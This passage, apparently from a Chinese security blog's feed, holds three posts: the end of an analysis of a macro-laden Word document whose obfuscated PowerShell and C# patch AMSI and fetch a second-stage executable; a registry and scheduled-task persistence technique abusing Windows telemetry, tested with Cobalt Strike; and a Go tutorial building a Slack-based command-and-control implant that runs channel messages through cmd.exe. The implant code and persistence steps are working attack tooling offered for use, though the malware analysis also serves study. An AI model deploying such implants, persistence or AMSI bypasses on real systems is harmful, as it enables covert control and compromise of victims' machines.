alt="5"></p><p>同时我们也可以到自动执行的函数的位置。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-3.png" alt="3"></p><p>在VBA代码或文档内容，属性或设置中不容易看到&#x2F;显示。我们首先在“ Sub Document_Open()”函数中放置一个断点。此功能是在打开Word文档时运行的功能。然后，我们运行将在断点处中断的脚本。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-7.png" alt="7"></p><p>这两个变量将被读入VBA脚本并进行解码。这是隐藏此脚本功能的地方。第一个变量被解码为WMI对象”winmgmts:\.\root\cimv2:Win32_Process”，该对象负责启动第二个变量的内容</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-8.png" alt="8"></p><p>第二个变量被解码Powershell。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-9.png" alt="9"></p><p>如果我们继续运行脚本，它将最终启动Powershell终端，并使用变量2中的解码脚本。在Powershell启动时，我们可以在系统日志中查看该脚本的内容。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-6.png" alt="6"></p><h2 id="3-powershell混淆"><a href="#3-powershell混淆" class="headerlink" title="3.powershell混淆"></a>3.powershell混淆</h2><p>依旧是代码混淆，现在我们已经提取了Powershell，我们可以再次清理一下代码，并通过替换“;”将其分成适当的行。用“; \ n”并固定行距。 </p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-10.png" alt="10"></p><p>Powershell脚本非常简单。从清理后的代码中，我们可以在顶部看到一个去模糊函数，该函数负责解码中间变量中的文本斑点。我们还在脚本的底部看到一个“ Add-Type”行，该行正在调用“ c193b()”函数。这通常用于以与Powershell不同的编程语言来内联脚本。在这种情况下，我们看到脚本已解码了C＃代码</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-11.png" alt="11"></p><h2 id="4-C-混淆"><a href="#4-C-混淆" class="headerlink" title="4. C#混淆"></a>4. C#混淆</h2><p>到目前为止，我们已经做到了。我们已经运行了启用VBA的Word文档，让它将隐藏的变量解码为通过WMI对象启动的混淆的Powershell，并且对混淆的Powershell进行了查找以找到内联的C＃。我们快完成了。我们可以再次清理反混淆的代码，以便可以将其加载到适当的IDE中并进行调试。在这种情况下，我们拥有C＃，因此我们可以在Visual Studio中启动一个新的C＃项目，并将代码粘贴到“ Hello World”函数之后，如下所示。我们需要将“ using”语句放在顶部，然后将我们混淆处理的“ public class”代码粘贴到main函数下面。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-12.png" alt="12"></p><p>从我们的Powershell脚本中，我们看到它正在函数“ c193b()”处调用“ yba2983”类。因此，我们需要将其放置在程序“ Main”中，以便模仿Powershell的切换。确保在“ c193b”函数中放置一个断点，以便可以逐步完成它。</p><h2 id="5-BYPASS-AMSI"><a href="#5-BYPASS-AMSI" class="headerlink" title="5.BYPASS AMSI"></a>5.BYPASS AMSI</h2><p>防恶意软件扫描接口（AMSI）是更高版本的Microsoft Windows附带的系统保护，可帮助防御这些类型的攻击。Microsoft将AMSI描述为：</p><blockquote><p>Windows反恶意软件扫描接口（AMSI）是一种通用接口标准，允许您的应用程序和服务与计算机上存在的任何反恶意软件产品集成。AMSI为您的最终用户及其数据，应用程序和工作负载提供了增强的恶意软件防护。</p></blockquote><p>简单来说，“ amsi.dll”在系统上运行，并通过AmsiScanBuffer API强制所有脚本输出。因此，我们将在AmsiScanBuffer接口中检查我们发现的所有模糊文本，以进行可疑&#x2F;恶意操作。如果找到任何内容，AMSI将拒绝执行脚本。有保护的地方就有旁路，这正是我们在C＃代码开头找到的内容。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-13.png" alt="13"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-14.png" alt="14"></p><p>这个特殊的<strong>bypass</strong>尝试使用<strong>“ amsi.dll”</strong>作为目标来调用“ loadlibrary”。如果成功，则表明系统上存在AMSI。接下来，代码将为AmsiScanBuffer接口调用“ GetProcAddress”，通过调用“ VirtualProtect”来取消保护其内存区域，然后通过对“ RtlMoveMemory”的调用有选择地修补“ amsi.dll”。通过修补“ amsi.dll”，他们删除了阻止脚本运行的保护性检查。 </p><h2 id="6-终止"><a href="#6-终止" class="headerlink" title="6.终止"></a>6.终止</h2><p>如果我们继续调试C＃代码，我们最终将对最终变量进行模糊处理，并显示预期下载的URL。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-15.png" alt="15"></p><p><strong>由于服务器关闭并没有接下去进行分析</strong>，代码将创建一个新的WebClient连接，将可执行文件下载到一个临时空间中，并启动该过程。该恶意软件的第二阶段可能是远程访问特洛伊木马（RAT），银行恶意软件，勒索软件等。但是，本文的目的是演示如何分析第一阶段，而不遵循第二阶段的下载。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-16.png" alt="16"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/120201030-17.png" alt="17"></p><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p>样本下载地址<a href="https://app.any.run/tasks/cca3277b-8f2d-43c4-9006-457af9be1883/">https://app.any.run/tasks/cca3277b-8f2d-43c4-9006-457af9be1883/</a></p><p>文章参考：<a href="https://www.ringzerolabs.com/2020/10/obfuscated-vba-powershell-c.html">https://www.ringzerolabs.com/2020/10/obfuscated-vba-powershell-c.html</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-20.jpg&quot; alt=&quot;20&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="windows" scheme="https://www.ggsec.cn/categories/windows/"/>
    
    <category term="恶意样本分析" scheme="https://www.ggsec.cn/categories/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Windows" scheme="https://www.ggsec.cn/tags/Windows/"/>
    
    <category term="恶意样本分析" scheme="https://www.ggsec.cn/tags/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>滥用WINDOWS TELEMETRY以实现持久化并提权</title>
    <link href="https://www.ggsec.cn/%E6%BB%A5%E7%94%A8WINDOWS%20TELEMETRY%E4%BB%A5%E5%AE%9E%E7%8E%B0%E6%8C%81%E4%B9%85%E5%8C%96%E5%B9%B6%E6%8F%90%E6%9D%83.html"/>
    <id>https://www.ggsec.cn/%E6%BB%A5%E7%94%A8WINDOWS%20TELEMETRY%E4%BB%A5%E5%AE%9E%E7%8E%B0%E6%8C%81%E4%B9%85%E5%8C%96%E5%B9%B6%E6%8F%90%E6%9D%83.html</id>
    <published>2020-10-15T12:15:15.000Z</published>
    <updated>2022-11-25T12:39:50.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201015-4.png" alt="Paschen1"></p><span id="more"></span><p>今天，我们将讨论一种持久化方法是由trustedsec的christopher-paschen发布的文章，该方法利用了微软过去十年在Windows版本中包含的一些出色的遥测技术。此处概述的过程会影响从2008R2&#x2F;Windows 7到2019&#x2F;Windows 10的Win系统。</p><p>此持久化技术需要安装本地管理员权限（要求具有写入注册表HKLM的能力），并且在自动运行中不可见。</p><p><strong>你需要知道的事情：</strong></p><ul><li>网络正常</li><li>将键值添加到<strong>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController</strong></li><li>在此新键值内，创建Reg_SZ值 <strong>Command</strong>，并将其数据值设置为你要启动的**.exe**文件。</li><li>创建用于维护，每天晚上，Oobe的DWORD密钥，并将它们全部设置为一个（仅每24小时运行一次每夜一次）</li><li>使用持久化，它应该从Windows计划任务定期运行</li><li>您可以使用<strong>schtasks &#x2F;run &#x2F;tn “\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser”</strong> 进行测试，也可以通过在任务计划程序中手动启动任务来进行测试。</li></ul><p>下面为示例，运行计划任务时，这些注册表添加项将作为系统启动notepad.exe。</p><p><strong>server 2008 R2</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201015-4.png" alt="Paschen1"></p><p>让我们深入研究正在发生的事情以及为什么这会在系统级别启动您的任务。首先，<strong>c:\windows \ system32\CompatTelRunner.exe</strong>似乎是二进制文件，<strong>旨在运行各种遥测任务</strong>。二进制本身本身并不会收集太多数据。CompatTelRunner似乎正在检查一些系统统计信息，以确保已连接网络，然后运行各种命令来执行实际的遥测收集。将此视为遥测管理器。</p><p>当<strong>CompatTelRunner.exe</strong>运行时（到2020年5月为当前版本），它会先检查是否满足一些条件，然后继续进行遥测任务。</p><p><strong>Win10 POC 测试</strong></p><p><strong>1.添加注册表键值</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201015-1.png" alt="1"></p><p><strong>2.添加计划任务</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201015-6.png" alt="6"></p><p>在win10看到的结果</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201015-1.jpg" alt="1"></p><p><strong>Win7 也是同样 的方式 测试</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201015-2.png" alt="2"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201015-3.png" alt="3"></p><p><strong>最后加载恶意的exp，进行使用cobaltstrike 进行测试</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201015-5.png" alt="5"></p><h2 id="防御加固策略"><a href="#防御加固策略" class="headerlink" title="防御加固策略"></a>防御加固策略</h2><p>将<strong>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\AppCompatFlags\TelemetryController</strong>的键值Sku和Nightly 设置为0</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201015-7.png" alt="7"></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.trustedsec.com/blog/abusing-windows-telemetry-for-persistence/?utm_content=131234033">https://www.trustedsec.com/blog/abusing-windows-telemetry-for-persistence/?utm_content=131234033</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201015-4.png&quot; alt=&quot;Paschen1&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="ATT&amp;CK" scheme="https://www.ggsec.cn/categories/ATT-CK/"/>
    
    
    <category term="windows" scheme="https://www.ggsec.cn/tags/windows/"/>
    
    <category term="ATT&amp;CK" scheme="https://www.ggsec.cn/tags/ATT-CK/"/>
    
  </entry>
  
  <entry>
    <title>slack C2 golang编写(T1102)</title>
    <link href="https://www.ggsec.cn/slack%20C2%20golang.html"/>
    <id>https://www.ggsec.cn/slack%20C2%20golang.html</id>
    <published>2020-09-20T13:03:23.000Z</published>
    <updated>2022-11-26T01:57:22.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/354B06159AA7196E0F0FC10CE498DE21.jpg" alt="enter description here"></p><span id="more"></span><h3 id=""><a href="#" class="headerlink" title="&lt;iframe"></a>&lt;iframe</h3><pre><code>width=&quot;800&quot; height=&quot;450&quot; src=&#39;https://demonsec666.oss-cn-qingdao.aliyuncs.com/Slackc2.mp4&#39;frameborder=&quot;0&quot; allowfullscreen&gt;</code></pre></iframe><p> Slack 是聊天群组 + 大规模工具集成 + 文件整合 + 统一搜索。截至2014年底，Slack 已经整合了电子邮件、短信、Google Drives、Twitter、Trello、Asana、GitHub 等 65 种工具和服务，可以把各种碎片化的企业沟通和协作集中到一起 。</p><h3 id="2-slackC2"><a href="#2-slackC2" class="headerlink" title="2.slackC2"></a>2.slackC2</h3><p>​       因前阵子正好在找资料的时候发现一篇文章“ <strong>SLUB最新变种分析：仅靠 Slack进行C2通信”</strong> ，感觉还是比较有意思的，所以抽空打算做下实验对其记录下。</p><p>​      思路其实大同小异，也是差不多可以借鉴参考开源的代码。<code>https://github.com/bkup/SlackShell</code></p><p>​      一旦公开了此功能，它便受到了许多恶意软件创建者的欢迎，因为它提供了利用现有平台的好处。攻击者无需闯入Slack，他们只需使用其功能来控制植入到公司网络中的恶意软件即可。更重要的是，这种Slack作为通信渠道的合法使用将使黑客避免使用传统的安全机制（例如EDR和数据包捕获NTA）进行检测。Slack API URL结构也将被证明是对安全机制的检测挑战。所有Slack API URL的格式都与<a href="https://slack.com/api/[METHOD">https://slack.com/api/[METHOD</a> ] 相同 ，这意味着未加密的DNS查询仅显示slack.com的分辨率，这使得将Slack API的使用与正常的网络浏览区分开来非常困难。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-11.png" alt="11"></p><p>​     恶意软件创建者可能会使用Slack作为主要或辅助C2渠道，并使用其他平台（如Github）进行备份。由于这些应用程序是合法的，并且经常用于移动文件，因此防病毒或终结点解决方案几乎不会检测到恶意代码的渗透或敏感数据的泄漏的风险。尽管使用通用应用程序的概念并不是什么新鲜事（通过将Twitter用作C2渠道，尤其是<a href="https://web.archive.org/web/20100516175402/http:/sunbeltblog.blogspot.com/2010/05/diy-twitter-botnet-creator.html">Twitter bot构建器</a>，已经进行了较早的尝试 ），但Slack的普遍采用将这种操作方法提升到了一个全新的水平。</p><p>​     这个新发现的沟通渠道是黑客与防御者之间战斗的又一步。它着重说明了需要利用基于机器的群集分析的安全工具，以提供更多有关行为的信息，以揭示整个攻击范围。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-1.png" alt="1"></p><h3 id="3-客户端poc功能思路编写"><a href="#3-客户端poc功能思路编写" class="headerlink" title="3.客户端poc功能思路编写"></a>3.客户端poc功能思路编写</h3><p>1.服务端指定频道发送命令，由客户端接收</p><p>2.客户端接收服务端接收指令，执行命令</p><p>3.客户端执行结果，返回传送给服务端。</p><p>4.指定服务端命令标识，让客户端判定是否为命令</p><p>条件（指定频道、slack token和slack api）</p><p>Slack API 整理（发送信息，频道信息接收）</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-2.png" alt="2"></p><h3 id="4-API测试"><a href="#4-API测试" class="headerlink" title="4.API测试"></a>4.API测试</h3><p>以下为slack 官方API 测试地址</p><p> <a href="https://api.slack.com/methods/chat.postMessage">https://api.slack.com/methods/chat.postMessage</a> </p><p> <a href="https://api.slack.com/methods/conversations.history">https://api.slack.com/methods/conversations.history</a> </p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-4.png" alt="4"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-3.png" alt="3"></p><p>另外我们需要几个参数 一个为token，另一个为channel</p><p>那么channel可以在 <a href="https://app.slack.com/client/TMFHAPNTS/xxxxx%EF%BC%8C%E7%99%BB%E5%BD%95%E5%90%8E%E6%89%BE%E7%9A%84ID">https://app.slack.com/client/TMFHAPNTS/xxxxx，登录后找的ID</a></p><p>而token 可在 <a href="https://api.slack.com/legacy/custom-integrations/legacy-tokens">https://api.slack.com/legacy/custom-integrations/legacy-tokens</a>  中获取</p><p><strong>发送频道信息</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-5.png" alt="5"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-6.png" alt="6"></p><p><strong>查询频道信息</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-7.png" alt="7"></p><h3 id="5-golang功能编写"><a href="#5-golang功能编写" class="headerlink" title="5.golang功能编写"></a>5.golang功能编写</h3><h4 id="5-1-打印频道信息"><a href="#5-1-打印频道信息" class="headerlink" title="5.1 打印频道信息"></a>5.1 打印频道信息</h4><p>首先定义API、tokon、频道信息</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> (</span><br><span class="line">History_api = <span class="string">&quot;https://slack.com/api/conversations.history&quot;</span></span><br><span class="line">PostMessage = <span class="string">&quot;https://slack.com/api/chat.postMessage&quot;</span></span><br><span class="line">Token       = <span class="string">&quot;xoxp-729588xxxxxxx&quot;</span></span><br><span class="line">Channel     = <span class="string">&quot;xxxxxx&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>然后再定义中文编码的问题</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> utils</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;golang.org/x/text/encoding/simplifiedchinese&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Charset <span class="type">string</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">UTF8    = Charset(<span class="string">&quot;UTF-8&quot;</span>)</span><br><span class="line">GB18030 = Charset(<span class="string">&quot;GB18030&quot;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ConvertByte2String</span><span class="params">(<span class="type">byte</span> []<span class="type">byte</span>, charset Charset)</span></span> <span class="type">string</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str <span class="type">string</span></span><br><span class="line"><span class="keyword">switch</span> charset &#123;</span><br><span class="line"><span class="keyword">case</span> GB18030:</span><br><span class="line"><span class="keyword">var</span> decodeBytes, _ = simplifiedchinese.GB18030.NewDecoder().Bytes(<span class="type">byte</span>)</span><br><span class="line">str = <span class="type">string</span>(decodeBytes)</span><br><span class="line"><span class="keyword">case</span> UTF8:</span><br><span class="line"><span class="keyword">fallthrough</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">str = <span class="type">string</span>(<span class="type">byte</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> str</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下面开始定义main函数的内容</p><p><strong>指定频道和token 查看频道的信息</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">req, err := http.NewRequest(<span class="string">&quot;GET&quot;</span>, utils.History_api, <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Print(err)</span><br><span class="line">os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// GET URL  获取频道的字符串内容</span></span><br><span class="line">q := req.URL.Query()</span><br><span class="line">q.Add(<span class="string">&quot;token&quot;</span>, utils.Token)</span><br><span class="line">q.Add(<span class="string">&quot;channel&quot;</span>, utils.Channel)</span><br><span class="line">q.Add(<span class="string">&quot;pretty&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">req.URL.RawQuery = q.Encode()</span><br><span class="line"><span class="keyword">var</span> resp *http.Response</span><br><span class="line">resp, err = http.DefaultClient.Do(req)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Print(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// fmt.Println(url)</span></span><br><span class="line"><span class="comment">//defer resp.Body.Close()</span></span><br><span class="line">body, err := ioutil.ReadAll(resp.Body)</span><br><span class="line">resp.Body.Close()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// handle error</span></span><br><span class="line">&#125;</span><br><span class="line">json := <span class="type">string</span>(body)</span><br><span class="line"><span class="comment">//将GET URL 中的json值赋值给json变量</span></span><br><span class="line"></span><br><span class="line">text := gjson.Get(json, <span class="string">&quot;messages.0.text&quot;</span>)</span><br><span class="line">fmt.Print(text)</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-8.png" alt="8"></p><h4 id="5-2-发送信息给频道"><a href="#5-2-发送信息给频道" class="headerlink" title="5.2 发送信息给频道"></a>5.2 发送信息给频道</h4><p><strong>使用post 传参发送hello,i am xxxx指定频道</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">req, err := http.NewRequest(<span class="string">&quot;POST&quot;</span>, utils.PostMessage, <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Print(err)</span><br><span class="line">os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line">p := req.URL.Query()</span><br><span class="line">p.Add(<span class="string">&quot;token&quot;</span>, utils.Token)</span><br><span class="line">p.Add(<span class="string">&quot;channel&quot;</span>, utils.Channel)</span><br><span class="line">p.Add(<span class="string">&quot;pretty&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.Add(<span class="string">&quot;text&quot;</span>, <span class="string">&quot;hello,i am xxxx&quot;</span>)</span><br><span class="line">req.URL.RawQuery = p.Encode()</span><br><span class="line"><span class="keyword">var</span> resp *http.Response</span><br><span class="line">resp, err = http.DefaultClient.Do(req)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Print(err)</span><br><span class="line">&#125;</span><br><span class="line">body, err := ioutil.ReadAll(resp.Body)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// handle error</span></span><br><span class="line">&#125;</span><br><span class="line">postMessage := <span class="type">string</span>(body)</span><br><span class="line">OUTPUT := gjson.Get(postMessage, <span class="string">&quot;message.0&quot;</span>)</span><br><span class="line">log.Println(OUTPUT)</span><br><span class="line"><span class="comment">//fmt.Println()用于将输出的结果返回到slack频道中</span></span><br><span class="line">resp.Body.Close()</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-9.png" alt="9"></p><h4 id="5-3指定命令标识"><a href="#5-3指定命令标识" class="headerlink" title="5.3指定命令标识"></a>5.3指定命令标识</h4><p>指定服务端命令标识，让客户端判定是否为命令</p><p>思路为，获取频道信息的字符串，如果发送过来的标识为<strong>”cmd  xxxxx“</strong>，则为执行命令，如果不是，则跳过。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">text := gjson.Get(json, <span class="string">&quot;messages.0.text&quot;</span>)</span><br><span class="line"><span class="comment">// fmt.Print(text)</span></span><br><span class="line">cmd := strings.Split(text.String(), <span class="string">&quot; &quot;</span>)</span><br><span class="line">m := <span class="keyword">map</span>[<span class="keyword">interface</span>&#123;&#125;]<span class="keyword">struct</span>&#123;&#125;&#123; <span class="comment">//定义列表命令</span></span><br><span class="line"><span class="string">&quot;cmd&quot;</span>: &#123;&#125;,</span><br><span class="line">&#125;</span><br><span class="line">cmdlist := cmd[<span class="number">0</span>] <span class="comment">//slack频道输出的字符串第一个元素如果是列表中的就执行以下内容</span></span><br><span class="line"><span class="comment">// fmt.Println(cmd[1])</span></span><br><span class="line"><span class="keyword">if</span> _, run := m[cmdlist]; run &#123;</span><br><span class="line"><span class="keyword">if</span> cmdlist == <span class="string">&quot;cmd&quot;</span> &#123;</span><br><span class="line"><span class="comment">//判断接受过来的字符第一个元素是否为cmd字符串，【用于执行命令】</span></span><br><span class="line"><span class="comment">// if runtime.GOOS == &quot;windows&quot; &#123;</span></span><br><span class="line">command := exec.Command(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd[<span class="number">1</span>])</span><br><span class="line"><span class="comment">// &#125; else &#123;</span></span><br><span class="line"><span class="comment">// command := exec.Command(cmd[1])</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//取值为第二元素为服务端接受的命令，并执行命令</span></span><br><span class="line">stdoutStderr, err := command.CombinedOutput()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="完整效果"><a href="#完整效果" class="headerlink" title="完整效果"></a>完整效果</h3><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-10.png" alt="10"></p><h3 id="6-完整代码"><a href="#6-完整代码" class="headerlink" title="6.完整代码"></a>6.完整代码</h3><p><strong>utils.go</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> utils</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;golang.org/x/text/encoding/simplifiedchinese&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Charset <span class="type">string</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">UTF8    = Charset(<span class="string">&quot;UTF-8&quot;</span>)</span><br><span class="line">GB18030 = Charset(<span class="string">&quot;GB18030&quot;</span>)</span><br><span class="line">History_api = <span class="string">&quot;https://slack.com/api/conversations.history&quot;</span></span><br><span class="line">PostMessage = <span class="string">&quot;https://slack.com/api/chat.postMessage&quot;</span></span><br><span class="line">Token       = <span class="string">&quot;xoxp-729588xxxxxxx&quot;</span></span><br><span class="line">Channel     = <span class="string">&quot;xxxxxx&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ConvertByte2String</span><span class="params">(<span class="type">byte</span> []<span class="type">byte</span>, charset Charset)</span></span> <span class="type">string</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str <span class="type">string</span></span><br><span class="line"><span class="keyword">switch</span> charset &#123;</span><br><span class="line"><span class="keyword">case</span> GB18030:</span><br><span class="line"><span class="keyword">var</span> decodeBytes, _ = simplifiedchinese.GB18030.NewDecoder().Bytes(<span class="type">byte</span>)</span><br><span class="line">str = <span class="type">string</span>(decodeBytes)</span><br><span class="line"><span class="keyword">case</span> UTF8:</span><br><span class="line"><span class="keyword">fallthrough</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">str = <span class="type">string</span>(<span class="type">byte</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> str</span><br><span class="line">&#125;</span><br><span 